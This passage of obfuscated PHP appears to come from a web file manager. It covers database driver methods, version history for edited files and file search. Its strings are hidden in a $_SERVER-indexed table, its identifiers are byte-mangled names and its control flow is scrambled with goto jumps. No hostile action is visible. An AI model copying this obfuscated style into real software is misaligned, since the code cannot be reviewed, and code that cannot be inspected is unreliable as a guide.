$FÈÌ²Ïğè„); } } goto cáïÏäÅ‹î; B¼„œòîØ: } public function getTables($eÑİ‚ØêØÄ = '') { $B×†Œ†íŠÙ =& $_SERVER[¾÷]; if (think_config($B×†Œ†íŠÙ[886])) { $dâ¸õê°ÃÈ = str_replace($B×†Œ†íŠÙ[887], $eÑİ‚ØêØÄ, think_config($B×†Œ†íŠÙ[886])); } else { switch ($this->dbType) { case $B×†Œ†íŠÙ[854]: case $B×†Œ†íŠÙ[856]: $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[888]; break; case $B×†Œ†íŠÙ[853]: case $B×†Œ†íŠÙ[871]: $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[889]; break; case $B×†Œ†íŠÙ[880]: $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[890]; break; case $B×†Œ†íŠÙ[855]: think_exception(think_lang($B×†Œ†íŠÙ[891]) . $B×†Œ†íŠÙ[892]); break; case $B×†Œ†íŠÙ[872]: $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[52] . $B×†Œ†íŠÙ[53] . $B×†Œ†íŠÙ[54]; break; case $B×†Œ†íŠÙ[883]: default: if (!empty($eÑİ‚ØêØÄ)) { $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[836] . $eÑİ‚ØêØÄ . $B×†Œ†íŠÙ[837]; } else { $dâ¸õê°ÃÈ = $B×†Œ†íŠÙ[838]; } } } $FÉ¯Æ²×ˆ = $this->query($dâ¸õê°ÃÈ); $A‡øØªÈóõ = array(); foreach ($FÉ¯Æ²×ˆ as $a˜·Ş«Ÿ˜® => $BˆŠÃŸÌ‰½) { $A‡øØªÈóõ[$a˜·Ş«Ÿ˜®] = current($BˆŠÃŸÌ‰½); } return $A‡øØªÈóõ; } protected function parseLimit($AÀÑĞ ‘å†) { $d¼šùõò¶… =& $_SERVER[¾÷]; $aÀèƒøÂº = $d¼šùõò¶…[43]; if (!empty($AÀÑĞ ‘å†)) { switch ($this->dbType) { case $d¼šùõò¶…[880]: case $d¼šùõò¶…[872]: $AÀÑĞ ‘å† = explode($d¼šùõò¶…[57], $AÀÑĞ ‘å†); if (count($AÀÑĞ ‘å†) > 1) { $aÀèƒøÂº .= $d¼šùõò¶…[58] . $AÀÑĞ ‘å†[1] . $d¼šùõò¶…[59] . $AÀÑĞ ‘å†[0] . $d¼šùõò¶…[60]; } else { $aÀèƒøÂº .= $d¼šùõò¶…[58] . $AÀÑĞ ‘å†[0] . $d¼šùõò¶…[60]; } break; case $d¼šùõò¶…[853]: case $d¼šùõò¶…[871]: break; case $d¼šùõò¶…[855]: break; case $d¼šùõò¶…[854]: case $d¼šùõò¶…[856]: break; case $d¼šùõò¶…[883]: default: $aÀèƒøÂº .= $d¼šùõò¶…[58] . $AÀÑĞ ‘å† . $d¼šùõò¶…[60]; } } return $aÀèƒøÂº; } public function parseKey(&$CÂô‡á§½, $bùÇöÉ¿©” = true) { $E¨ŞñĞâä =& $_SERVER[¾÷]; if ($bùÇöÉ¿©”) { $CÂô‡á§½ = $this->parseKeyCheck($CÂô‡á§½); } if ($this->dbType == $E¨ŞñĞâä[883]) { if ($CÂô‡á§½ != $E¨ŞñĞâä[191] && !preg_match($E¨ŞñĞâä[848], $CÂô‡á§½)) { $CÂô‡á§½ = $E¨ŞñĞâä[389] . trim($CÂô‡á§½, $E¨ŞñĞâä[389]) . $E¨ŞñĞâä[389]; } return $CÂô‡á§½; } else { return parent::parseKey($CÂô‡á§½, $bùÇöÉ¿©”); } } public function close() { $this->_linkID = null; } public function error() { $c¶©Šš·Êë =& $_SERVER[¾÷]; if ($this->PDOStatement) { $A§¸Ú¬¤Ñ– = $this->PDOStatement->errorInfo(); $this->error = $A§¸Ú¬¤Ñ–[1] . $c¶©Šš·Êë[14] . $A§¸Ú¬¤Ñ–[2]; } else { $this->error = $c¶©Šš·Êë[43]; } if ($c¶©Šš·Êë[43] != $this->queryStr) { $this->error .= LNG($c¶©Šš·Êë[55]) . $this->queryStr; } think_trace($this->error, $c¶©Šš·Êë[43], $c¶©Šš·Êë[56]); return $this->error; } public function escapeString($Cì£……¯£Ú) { $EŸáŸ“¾ =& $_SERVER[¾÷]; switch ($this->dbType) { case $EŸáŸ“¾[880]: case $EŸáŸ“¾[853]: case $EŸáŸ“¾[871]: case $EŸáŸ“¾[883]: return addslashes($Cì£……¯£Ú); case $EŸáŸ“¾[855]: case $EŸáŸ“¾[872]: case $EŸáŸ“¾[854]: case $EŸáŸ“¾[856]: return str_ireplace($EŸáŸ“¾[65], $EŸáŸ“¾[66], $Cì£……¯£Ú); } } protected function parseValue($d“§®¹’) { $eÄÚë†Şù =& $_SERVER[¾÷]; if (is_string($d“§®¹’)) { $d“§®¹’ = strpos($d“§®¹’, $eÄÚë†Şù[14]) === 0 ? $this->escapeString($d“§®¹’) : $eÄÚë†Şù[893] . $this->escapeString($d“§®¹’) . $eÄÚë†Şù[893]; } elseif (isset($d“§®¹’[0]) && is_string($d“§®¹’[0]) && strtolower($d“§®¹’[0]) == $eÄÚë†Şù[302]) { $d“§®¹’ = $this->escapeString($d“§®¹’[1]); } elseif (is_array($d“§®¹’)) { $d“§®¹’ = array_map(array($this, $eÄÚë†Şù[894]), $d“§®¹’); } elseif (is_bool($d“§®¹’)) { $d“§®¹’ = $d“§®¹’ ? $eÄÚë†Şù[96] : $eÄÚë†Şù[500]; } elseif (is_null($d“§®¹’)) { $d“§®¹’ = $eÄÚë†Şù[112]; } return $d“§®¹’; } public function getLastInsertId() { $FÔÇßØáÃ =& $_SERVER[¾÷]; switch ($this->dbType) { case $FÔÇßØáÃ[880]: case $FÔÇßØáÃ[872]: case $FÔÇßØáÃ[853]: case $FÔÇßØáÃ[871]: case $FÔÇßØáÃ[855]: case $FÔÇßØáÃ[883]: return $this->_linkID->lastInsertId(); case $FÔÇßØáÃ[854]: case $FÔÇßØáÃ[856]: $c½ì©ÖŸ¼ = $this->table; $dÜ„ŒöÕ¨ = $this->query("\x53\105\114\x45\x43\x54\40{$c½ì©ÖŸ¼}\x2e\143\165\x72\162\x76\x61\154\x20\x63\x75\162\x72\166\x61\154\x20\106\x52\x4f\115\x20\144\x75\x61\x6c"); return $dÜ„ŒöÕ¨ ? $dÜ„ŒöÕ¨[0][$FÔÇßØáÃ[895]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($có¶´óùÓğ) { $C…Ò…²ç¦Ê =& $_SERVER[¾÷]; if (!CacheLock::fileLock($C…Ò…²ç¦Ê[19])) { return !1; } $BÚƒ¥‰‘ù¹ = parent::query($có¶´óùÓğ); CacheLock::fileUnLock($C…Ò…²ç¦Ê[19]); return $BÚƒ¥‰‘ù¹; } public function execute($aˆáàÙ–±•) { $D‹´°ÅÉ™‘ =& $_SERVER[¾÷]; if (!CacheLock::fileLock($D‹´°ÅÉ™‘[19])) { return !1; } $DÄ«ÂÕ½Å = parent::execute($aˆáàÙ–±•); CacheLock::fileUnLock($D‹´°ÅÉ™‘[19]); return $DÄ«ÂÕ½Å; } } class DbSqlite3 extends DbSqlite3Base { public function query($eµïã×´§) { $C¥Óß™Õˆƒ =& $_SERVER[¾÷]; if (!CacheLock::fileLock($C¥Óß™Õˆƒ[19])) { return !1; } $eèï¨›‚¤ = parent::query($eµïã×´§); CacheLock::fileUnLock($C¥Óß™Õˆƒ[19]); return $eèï¨›‚¤; } public function execute($d´ßãŒÉ×) { $E´Ç×Ê–˜ =& $_SERVER[¾÷]; if (!CacheLock::fileLock($E´Ç×Ê–˜[19])) { return !1; } $e«²ŸíÃ—Ö = parent::execute($d´ßãŒÉ×); CacheLock::fileUnLock($E´Ç×Ê–˜[19]); return $e«²ŸíÃ—Ö; } } goto e•Ê½Şİç; C¸ÎÙ Úó§: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\143\x65\x5f\x68\151\x73\164\157\x72\x79"; public function historyCount($eöùÛ‡ÕÃ) { goto Dç›Í¢Üõ¦; Bµ½Á‹‰§‘: return array_to_keyvalue($CŠÎ…Ğ¹·, $Eš•ØÒ„‰¹[399], $Eš•ØÒ„‰¹[483]); goto e­ëõ¶íÒ¡; b¬Ä—ñ°ô: $dîš…˜¬»¤ = array($Eš•ØÒ„‰¹[399], $Eš•ØÒ„‰¹[1700] => $Eš•ØÒ„‰¹[483]); $bÏŸ›¬åÊ = array($Eš•ØÒ„‰¹[399] => array($Eš•ØÒ„‰¹[17], $eöùÛ‡ÕÃ)); $CŠÎ…Ğ¹· = $this->field($dîš…˜¬»¤)->where($bÏŸ›¬åÊ)->group($Eš•ØÒ„‰¹[399])->select(); goto Bµ½Á‹‰§‘; Dç›Í¢Üõ¦: $Eš•ØÒ„‰¹ =& $_SERVER[¾÷]; if (!$eöùÛ‡ÕÃ) { return array(); } if (is_string($eöùÛ‡ÕÃ) || is_int($eöùÛ‡ÕÃ)) { $eöùÛ‡ÕÃ = array($eöùÛ‡ÕÃ); } goto b¬Ä—ñ°ô; e­ëõ¶íÒ¡: } public function addHistory($Bí’ß¢¡, $BˆãšÕ¾áõ = '') { $F¢îİÌ™ Ú =& $_SERVER[¾÷]; $F åµº±ÓÙ = array($F¢îİÌ™ Ú[413] => $Bí’ß¢¡[$F¢îİÌ™ Ú[399]], $F¢îİÌ™ Ú[1497] => isset($Bí’ß¢¡[$F¢îİÌ™ Ú[437]]) ? $Bí’ß¢¡[$F¢îİÌ™ Ú[437]] : $Bí’ß¢¡[$F¢îİÌ™ Ú[435]], $F¢îİÌ™ Ú[451] => $Bí’ß¢¡[$F¢îİÌ™ Ú[450]], $F¢îİÌ™ Ú[552] => $Bí’ß¢¡[$F¢îİÌ™ Ú[87]], $F¢îİÌ™ Ú[1897] => $BˆãšÕ¾áõ); $C•®ó²É¯» = $GLOBALS[$F¢îİÌ™ Ú[16]][$F¢îİÌ™ Ú[97]][$F¢îİÌ™ Ú[1079]]; if ($C•®ó²É¯» > 1) { $this->historyAutoClear($F åµº±ÓÙ[$F¢îİÌ™ Ú[399]]); $this->add($F åµº±ÓÙ); } Hook::trigger($F¢îİÌ™ Ú[1898], $F åµº±ÓÙ); Model($F¢îİÌ™ Ú[1899])->eventFileEdit($Bí’ß¢¡[$F¢îİÌ™ Ú[399]]); } private function historyAutoClear($d‰‡Îâš–İ) { goto e»¶ š¨å; có·Âªø£Æ: $f§ˆË§±ªÒ = array($DœåˆâÁ­”[413] => $d‰‡Îâš–İ); $BÏñî¢á Ä = $this->field($DœåˆâÁ­”[1900])->where($f§ˆË§±ªÒ)->order($DœåˆâÁ­”[1894])->select(); if (!$BÏñî¢á Ä || $BŠóĞ†Ü«ƒ >= count($BÏñî¢á Ä)) { return; } goto aŞÈ§õ”; e¯î±†Ö«á: $EŠ†È³£Ê = array_slice($EŠ†È³£Ê, $BŠóĞ†Ü«ƒ); if (!$EÈ‡§õê || !$EŠ†È³£Ê) { return; } $f§ˆË§±ªÒ = array($DœåˆâÁ­”[415] => array($DœåˆâÁ­”[17], $EÈ‡§õê)); goto AÉĞ¶š…ù¶; AÉĞ¶š…ù¶: $this->where($f§ˆË§±ªÒ)->delete(); Model($DœåˆâÁ­”[453])->remove($EŠ†È³£Ê); goto c½‡Á£¾³´; e»¶ š¨å: $DœåˆâÁ­” =& $_SERVER[¾÷]; $e¬ĞÔÃ´ë˜ = Model($DœåˆâÁ­”[1100])->get($DœåˆâÁ­”[1101]); $Cğ ‚¨…Ö = $GLOBALS[$DœåˆâÁ­”[16]][$DœåˆâÁ­”[97]][$DœåˆâÁ­”[1079]]; goto BÑóì…š¡ã; BÑóì…š¡ã: $BŠóĞ†Ü«ƒ = $e¬ĞÔÃ´ë˜ == $DœåˆâÁ­”[1102] ? 5 : $Cğ ‚¨…Ö; if ($Cğ ‚¨…Ö <= 1) { $BŠóĞ†Ü«ƒ = 1; } if ($BŠóĞ†Ü«ƒ >= 500) { return; } goto có·Âªø£Æ; aŞÈ§õ”: $EÈ‡§õê = array_to_keyvalue($BÏñî¢á Ä, $DœåˆâÁ­”[43], $DœåˆâÁ­”[397]); $EÈ‡§õê = array_slice($EÈ‡§õê, $BŠóĞ†Ü«ƒ); $EŠ†È³£Ê = array_to_keyvalue($BÏñî¢á Ä, $DœåˆâÁ­”[43], $DœåˆâÁ­”[450]); goto e¯î±†Ö«á; c½‡Á£¾³´: } public function listData($F‰àµˆŸ·) { goto DâØ›„°’ù; B‹‰Ü†ÂÊš: $Eçïóƒæ¢Ö = 5; if ($dâ›ò·ßÍÇ == $d®¦ÑÛÌÀ…[1102]) { $Aå¾ì‹ß™[$d®¦ÑÛÌÀ…[374]] = array_slice($Aå¾ì‹ß™[$d®¦ÑÛÌÀ…[374]], 0, $Eçïóƒæ¢Ö); $Aå¾ì‹ß™[$d®¦ÑÛÌÀ…[371]] = array($d®¦ÑÛÌÀ…[1902] => 1, $d®¦ÑÛÌÀ…[1903] => 20, $d®¦ÑÛÌÀ…[1904] => 1, $d®¦ÑÛÌÀ…[1905] => count($Aå¾ì‹ß™[$d®¦ÑÛÌÀ…[374]])); } return $Aå¾ì‹ß™; goto cò½ÓæŞ‚; DâØ›„°’ù: $d®¦ÑÛÌÀ… =& $_SERVER[¾÷]; $Fƒ¹³»Ç¶è = array($d®¦ÑÛÌÀ…[413] => $F‰àµˆŸ·); $bœ¶ƒŒÖƒ = $d®¦ÑÛÌÀ…[1901]; goto FÑÄÚ„“ôŠ; FÑÄÚ„“ôŠ: $Aå¾ì‹ß™ = $this->field($bœ¶ƒŒÖƒ)->where($Fƒ¹³»Ç¶è)->order($d®¦ÑÛÌÀ…[1894])->selectPage(); $this->_listAppendUser($Aå¾ì‹ß™[$d®¦ÑÛÌÀ…[374]]); $dâ›ò·ßÍÇ = Model($d®¦ÑÛÌÀ…[1100])->get($d®¦ÑÛÌÀ…[1101]); goto B‹‰Ü†ÂÊš; cò½ÓæŞ‚: } protected function _listAppendUser(&$BÆ“…—í°Û) { $aƒ›ÖªĞŞ =& $_SERVER[¾÷]; $d·£§§ÄÀ  = array_to_keyvalue($BÆ“…—í°Û, $aƒ›ÖªĞŞ[43], $aƒ›ÖªĞŞ[1505]); $D™ô®‰Š® = Model($aƒ›ÖªĞŞ[510])->userListInfo($d·£§§ÄÀ ); foreach ($BÆ“…—í°Û as &$dÈÙ¯Şñ‘†) { $e´ƒ†ÈŸÙÚ = $dÈÙ¯Şñ‘†[$aƒ›ÖªĞŞ[1505]]; $dÈÙ¯Şñ‘†[$aƒ›ÖªĞŞ[435]] = $D™ô®‰Š®[$e´ƒ†ÈŸÙÚ] ? $D™ô®‰Š®[$e´ƒ†ÈŸÙÚ] : !1; } unset($dÈÙ¯Şñ‘†); } public function fileInfo($B‡äÓòì§) { $EÁİçÑ¶£ =& $_SERVER[¾÷]; $eùòŞ±¢Š = $this->tablePrefix; $AÓ”Ü…åÌù = "{$eùòŞ±¢Š}\151\x6f\x5f\x66\x69\154\x65\40\146\x69\x6c\145\x73\40\x6f\156\x20\146\151\x6c\145\163\x2e\x66\x69\154\x65\x49\x44\x20\75\40\x68\151\x73\164\157\x72\171\56\146\x69\154\145\x49\x44"; return $this->alias($EÁİçÑ¶£[1906])->where(array($EÁİçÑ¶£[415] => $B‡äÓòì§))->join($AÓ”Ü…åÌù, $EÁİçÑ¶£[1907])->find(); } public function removeItem($aÁë»ñàÔ«) { $fÂ°ØÆ‹ß =& $_SERVER[¾÷]; $d¢œ–¿Öâ = array($fÂ°ØÆ‹ß[415] => $aÁë»ñàÔ«); $A”Ù‡äÙ¢¹ = $this->where($d¢œ–¿Öâ)->find(); if ($A”Ù‡äÙ¢¹) { $b¢‡ä¥®Ì = $this->where($d¢œ–¿Öâ)->delete(); Model($fÂ°ØÆ‹ß[453])->remove($A”Ù‡äÙ¢¹[$fÂ°ØÆ‹ß[450]]); return $b¢‡ä¥®Ì; } return !1; } public function removeBySource($A„› à±à¢) { goto eÓŞ†åÑŒµ; fÄ›ç¬‚–Î: $Aé´æêôá¦ = array($cßŞÖç´á‚[413] => array($cßŞÖç´á‚[17], $A„› à±à¢)); $D¢’èöŞªÕ = $this->field($cßŞÖç´á‚[451])->where($Aé´æêôá¦)->select(); if ($D¢’èöŞªÕ) { $this->where($Aé´æêôá¦)->delete(); $a¨âêÙ† = array_to_keyvalue($D¢’èöŞªÕ, $cßŞÖç´á‚[43], $cßŞÖç´á‚[450]); Model($cßŞÖç´á‚[453])->remove($a¨âêÙ†); } goto Bîå®“Ïä–; eÓŞ†åÑŒµ: $cßŞÖç´á‚ =& $_SERVER[¾÷]; if (!$A„› à±à¢) { return !1; } if (!is_array($A„› à±à¢)) { $A„› à±à¢ = array($A„› à±à¢); } goto fÄ›ç¬‚–Î; Bîå®“Ïä–: return !0; goto AÄâÛÈÇ…; AÄâÛÈÇ…: } public function setDetail($DÛñØ–£Ô«, $eø’ƒëñ•ù) { $e©×êˆÃ— =& $_SERVER[¾÷]; return $this->where(array($e©×êˆÃ—[415] => $DÛñØ–£Ô«))->save(array($e©×êˆÃ—[1897] => $eø’ƒëñ•ù)); } public function rollbackToItem($b™Ş „·Â, $bãÔ©áì×) { goto eø½Ö‚­Ÿñ; aƒ‚‘‘‡…ê: $AµêØ¢Ì©› = $this->find($bãÔ©áì×); $EÉÏ¡šÁË = array($b‡©µî†ç[450] => $AµêØ¢Ì©›[$b‡©µî†ç[450]], $b‡©µî†ç[87] => $AµêØ¢Ì©›[$b‡©µî†ç[87]], $b‡©µî†ç[93] => time(), $b‡©µî†ç[437] => USER_ID); Model($b‡©µî†ç[776])->where(array($b‡©µî†ç[399] => $b™Ş „·Â))->save($EÉÏ¡šÁË); goto d†Æ³²ğùÚ; eø½Ö‚­Ÿñ: $b‡©µî†ç =& $_SERVER[¾÷]; $DæĞ§½Ê‘¸ = Model($b‡©µî†ç[776])->sourceInfo($b™Ş „·Â); $this->addHistory($DæĞ§½Ê‘¸, LNG($b‡©µî†ç[1908])); goto aƒ‚‘‘‡…ê; d†Æ³²ğùÚ: return $this->where(array($b‡©µî†ç[415] => $bãÔ©áì×))->delete(); goto fŒâõ¯¥ÜÖ; fŒâõ¯¥ÜÖ: } public function clearSame($C«³ÜÊ±‡Œ) { goto b¶á»—ÊÆ¹; dâè²’Â¬–: $BÂ¹°Ô‡‰å = array(); $DéÓ‘š‡È = array(); foreach ($C¦Ëè³Ö as $FŠ¤ÊÙÓ’) { if (!$FŠ¤ÊÙÓ’ || count($FŠ¤ÊÙÓ’) <= 1) { continue; } foreach ($FŠ¤ÊÙÓ’ as $d§ö–Ø›¢Ê) { $BÂ¹°Ô‡‰å[] = $d§ö–Ø›¢Ê[$a’ò˜­°Ï’[450]]; $DéÓ‘š‡È[] = $d§ö–Ø›¢Ê[$a’ò˜­°Ï’[397]]; } } goto c²ÉéÀê°; c²ÉéÀê°: if (!$DéÓ‘š‡È) { return; } $this->where(array($a’ò˜­°Ï’[397] => array($a’ò˜­°Ï’[17], $DéÓ‘š‡È)))->delete(); Model($a’ò˜­°Ï’[453])->remove($BÂ¹°Ô‡‰å); goto F„×Äø£¯Í; b¶á»—ÊÆ¹: $a’ò˜­°Ï’ =& $_SERVER[¾÷]; $bÄéğÌ”ƒ = $this->listData($C«³ÜÊ±‡Œ); $C¦Ëè³Ö = array_to_keyvalue_group($bÄéğÌ”ƒ, $a’ò˜­°Ï’[450]); goto dâè²’Â¬–; F„×Äø£¯Í: } public function userSpace() { $fŠ‚¶§¹—— =& $_SERVER[¾÷]; $eÃËİÕéœ = $this->tablePrefix; $CÉó¬ôÁ‘† = array($fŠ‚¶§¹——[1497] => USER_ID); $B ²Œƒ¦È = "{$eÃËİÕéœ}\151\x6f\137\146\x69\154\x65\x20\146\x69\x6c\x65\163\40\157\156\40\146\151\154\145\163\56\x66\151\154\x65\111\104\x20\x3d\40\x68\151\163\164\x6f\x72\x79\56\x66\x69\154\145\x49\x44"; return $this->alias($fŠ‚¶§¹——[1906])->where($CÉó¬ôÁ‘†)->join($B ²Œƒ¦È, $fŠ‚¶§¹——[1907])->sum($fŠ‚¶§¹——[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Fà«Š¯‚øë) { goto cÂ‰ÓÉÖğĞ; eÚÏÈå‚Ÿ: if (!$BâõÇ£Š•£) { return array(); } $aŒåòìíÜ· = $BâõÇ£Š•£[$aÍÄæ³ ›[177]]; $BÄ–êõİÈ¢ = $aÍÄæ³ ›[17]; goto c—ã¶Õõî•; c—ã¶Õõî•: if (!$BâõÇ£Š•£[$aÍÄæ³ ›[177]]) { $aç†šÕ‡³ï = array_to_keyvalue($c›Ï©ˆŒ°, $aÍÄæ³ ›[43], $aÍÄæ³ ›[177]); $aŒåòìíÜ· = implode($aÍÄæ³ ›[57], $aç†šÕ‡³ï); $BÄ–êõİÈ¢ = $aÍÄæ³ ›[1909]; } $F¼Ó§ˆÅ‹¯ = explode($aÍÄæ³ ›[57], trim($aŒåòìíÜ·, $aÍÄæ³ ›[57])); return array($BÄ–êõİÈ¢, $F¼Ó§ˆÅ‹¯); goto d©°æ•Ğ“; cÂ‰ÓÉÖğĞ: $aÍÄæ³ › =& $_SERVER[¾÷]; $c›Ï©ˆŒ° = KodIO::fileTypeList(); $BâõÇ£Š•£ = $c›Ï©ˆŒ°[$Fà«Š¯‚øë]; goto eÚÏÈå‚Ÿ; d©°æ•Ğ“: } public function listPathType($C‚í©’ßõÃ) { $e’­äÎÍ¢¿ =& $_SERVER[¾÷]; $A“Š¬¯æÓ¸ = $this->fileTypeWhere($C‚í©’ßõÃ); if (!$A“Š¬¯æÓ¸) { return array(); } $f†Í¼ç³Ğƒ = array($e’­äÎÍ¢¿[553] => SourceModel::TYPE_USER, $e’­äÎÍ¢¿[554] => USER_ID, $e’­äÎÍ¢¿[550] => 0, $e’­äÎÍ¢¿[551] => $A“Š¬¯æÓ¸); return $this->listSource($f†Í¼ç³Ğƒ); } public function listSearch($bË„óÓ–…Œ, $f£‡Üº† = 300) { goto BÅôÕ¯º•ˆ; aä—Óãé‰: $this->_listSearchGroupTag($cò”ÒÇ­éã, $bË„óÓ–…Œ, $A¹Š¡Ã»™); $this->_listDataApply($cò”ÒÇ­éã[$D‘ù„Á·ØÛ[374]]); $this->_listMake($cò”ÒÇ­éã); goto c•–“—õ†˜; Fí’—…¨¿º: if (!isset($AÊ´íÚÃÜ[$D‘ù„Á·ØÛ[426]])) { $AÊ´íÚÃÜ[$D‘ù„Á·ØÛ[426]] = 0; } $e”ºÃìƒõ = $D‘ù„Á·ØÛ[1911]; $A¹Š¡Ã»™ = $e”ºÃìƒõ; goto EÎï¬•¬ˆÉ; c•–“—õ†˜: return $cò”ÒÇ­éã; goto b—ø²Õç¥í; EÎï¬•¬ˆÉ: $this->_listSearchBindPinyin($bË„óÓ–…Œ, $AÊ´íÚÃÜ, $e”ºÃìƒõ); $this->alias($D‘ù„Á·ØÛ[520])->_makeOrder(); $AÊ´íÚÃÜ = $this->parseWhereLike($AÊ´íÚÃÜ); goto AçÓŒöÁ‡‚; BÅôÕ¯º•ˆ: $D‘ù„Á·ØÛ =& $_SERVER[¾÷]; if (isset($bË„óÓ–…Œ[$D‘ù„Á·ØÛ[1752]]) && $bË„óÓ–…Œ[$D‘ù„Á·ØÛ[1752]]) { $bË„óÓ–…Œ[$D‘ù„Á·ØÛ[1752]] = str_replace($D‘ù„Á·ØÛ[388], $D‘ù„Á·ØÛ[1910], trim($bË„óÓ–…Œ[$D‘ù„Á·ØÛ[1752]])); } $AÊ´íÚÃÜ = $this->_parseSearchWhere($bË„óÓ–…Œ); goto Fí’—…¨¿º; AçÓŒöÁ‡‚: $cò”ÒÇ­éã = $this->distinct(!0)->field($e”ºÃìƒõ)->where($AÊ´íÚÃÜ)->selectPage($f£‡Üº†); $this->_listSearchDesc($cò”ÒÇ­éã, $bË„óÓ–…Œ, $A¹Š¡Ã»™); $this->_listSearchTag($cò”ÒÇ­éã, $bË„óÓ–…Œ, $A¹Š¡Ã»™); goto aä—Óãé‰; b—ø²Õç¥í: } private function _listSearchTag(&$cÊÏ‘Á¹¨¹, $A²¥ñÇ²¯, $E±À¿¿º±¶) { goto f½¾•íˆ¢—; B×¬“ßÆØÆ: $bøçñ·”åÈ = array_to_keyvalue($bøçñ·”åÈ, $DŸ–© ß¨¿[43], $DŸ–© ß¨¿[85]); $D¨ºâõßö = array_unique($bøçñ·”åÈ); $this->_listSearchMerge($cÊÏ‘Á¹¨¹, $A²¥ñÇ²¯, $E±À¿¿º±¶, $D¨ºâõßö); goto Fù›¨‡é¿Ì; f½¾•íˆ¢—: $DŸ–© ß¨¿ =& $_SERVER[¾÷]; if (!$A²¥ñÇ²¯[$DŸ–© ß¨¿[1752]] || $cÊÏ‘Á¹¨¹[$DŸ–© ß¨¿[371]][$DŸ–© ß¨¿[358]] > 1) { return; } $eùó§¥Êç¡ = Model($DŸ–© ß¨¿[1912])->listData(); goto AËéáÂàŒù; aâ¹‚ğ•‘ˆ: if (!$DÒÓŠé‘©ğ) { return; } $c†İŠô¤ŠÄ = array($DŸ–© ß¨¿[422] => array($DŸ–© ß¨¿[17], $DÒÓŠé‘©ğ), $DŸ–© ß¨¿[1505] => USER_ID); $bøçñ·”åÈ = Model($DŸ–© ß¨¿[423])->field($DŸ–© ß¨¿[85])->where($c†İŠô¤ŠÄ)->select(); goto B×¬“ßÆØÆ; AËéáÂàŒù: $DÒÓŠé‘©ğ = array(); $CµÅ¶ˆ“‰• = $A²¥ñÇ²¯[$DŸ–© ß¨¿[1752]]; foreach ($eùó§¥Êç¡ as $f§¡¹«ÉÌì) { $e±ÊÛÙò¯ = $f§¡¹«ÉÌì[$DŸ–© ß¨¿[38]]; $aÈˆ‘‹¨ö¡ = str_replace($DŸ–© ß¨¿[60], $DŸ–© ß¨¿[43], Pinyin::encode($e±ÊÛÙò¯)); if (stripos($e±ÊÛÙò¯, $CµÅ¶ˆ“‰•) !== !1 || stripos($aÈˆ‘‹¨ö¡, $CµÅ¶ˆ“‰•) !== !1) { $DÒÓŠé‘©ğ[] = $f§¡¹«ÉÌì[$DŸ–© ß¨¿[397]]; } } goto aâ¹‚ğ•‘ˆ; Fù›¨‡é¿Ì: } private function _listSearchDesc(&$FÔñ²°•ïÏ, $c«ø¬ğÎö¸, $Dê…¿«êŒ) { goto E™™‰¸ç‚; dÇ÷à¶‘¿: $AÁæËêÑ¬æ = Model($Fõí¿Ÿä÷Ÿ[536])->field($Fõí¿Ÿä÷Ÿ[399])->where($EîÏ¾”¾Åó)->select(); $f÷æá×Õƒ¶ = array_to_keyvalue($AÁæËêÑ¬æ, $Fõí¿Ÿä÷Ÿ[43], $Fõí¿Ÿä÷Ÿ[399]); $this->_listSearchMerge($FÔñ²°•ïÏ, $c«ø¬ğÎö¸, $Dê…¿«êŒ, $f÷æá×Õƒ¶); goto Eù‡«Äã›; E™™‰¸ç‚: $Fõí¿Ÿä÷Ÿ =& $_SERVER[¾÷]; if (!$c«ø¬ğÎö¸[$Fõí¿Ÿä÷Ÿ[1752]] || $FÔñ²°•ïÏ[$Fõí¿Ÿä÷Ÿ[371]][$Fõí¿Ÿä÷Ÿ[358]] > 1) { return; } $A¹µäĞëÚï = $this->listSearchChildren($c«ø¬ğÎö¸[$Fõí¿Ÿä÷Ÿ[481]]); goto EÛÌÄİÀÓ; EÛÌÄİÀÓ: $A¹µäĞëÚï = array_unique($A¹µäĞëÚï); if (!$A¹µäĞëÚï) { return; } $EîÏ¾”¾Åó = array($Fõí¿Ÿä÷Ÿ[399] => array($Fõí¿Ÿä÷Ÿ[17], $A¹µäĞëÚï), $Fõí¿Ÿä÷Ÿ[102] => $Fõí¿Ÿä÷Ÿ[434], $Fõí¿Ÿä÷Ÿ[379] => array($Fõí¿Ÿä÷Ÿ[387], $Fõí¿Ÿä÷Ÿ[1754] . $c«ø¬ğÎö¸[$Fõí¿Ÿä÷Ÿ[1752]] . $Fõí¿Ÿä÷Ÿ[1754])); goto dÇ÷à¶‘¿; Eù‡«Äã›: } private function _listSearchGroupTag(&$BšÅ¦Á¯†Î, $f¤ŒØÅ³¢¬, $CöŸºÓ‚°) { goto cØ«©âÜß™; E˜œÌ¬´å‡: $BÔ˜‘’Ôó£ = array(); $Dº•ŠÁÒ§ = $f¤ŒØÅ³¢¬[$a„ƒçŞ£·•[1752]]; foreach ($D¦Í¢Ú½Ä±[$a„ƒçŞ£·•[374]] as $Bƒåİ “¥‘) { $E²´Öí‚ÌĞ = $Bƒåİ “¥‘[$a„ƒçŞ£·•[38]]; $EÏì¼ìå•… = str_replace($a„ƒçŞ£·•[60], $a„ƒçŞ£·•[43], Pinyin::encode($E²´Öí‚ÌĞ)); if (stripos($E²´Öí‚ÌĞ, $Dº•ŠÁÒ§) !== !1 || stripos($EÏì¼ìå•…, $Dº•ŠÁÒ§) !== !1) { $BÔ˜‘’Ôó£[] = $Bƒåİ “¥‘[$a„ƒçŞ£·•[397]]; } } goto Bß¢š¤Æ¹»; dçŒ«Œ»¸: if (!$eæ–ì‘Û£Ø || $eæ–ì‘Û£Ø[$a„ƒçŞ£·•[407]] != SourceModel::TYPE_GROUP) { return; } $EâÆÒ­‹Øˆ = $eæ–ì‘Û£Ø[$a„ƒçŞ£·•[487]]; $D¦Í¢Ú½Ä± = Model($a„ƒçŞ£·•[1913])->get($EâÆÒ­‹Øˆ); goto E˜œÌ¬´å‡; Bß¢š¤Æ¹»: if (!$BÔ˜‘’Ôó£) { return; } $d‡‚×…ÈŒ´ = array($a„ƒçŞ£·•[422] => array($a„ƒçŞ£·•[17], $BÔ˜‘’Ôó£), $a„ƒçŞ£·•[1505] => 0, $a„ƒçŞ£·•[39] => $a„ƒçŞ£·•[1776] . $EâÆÒ­‹Øˆ); 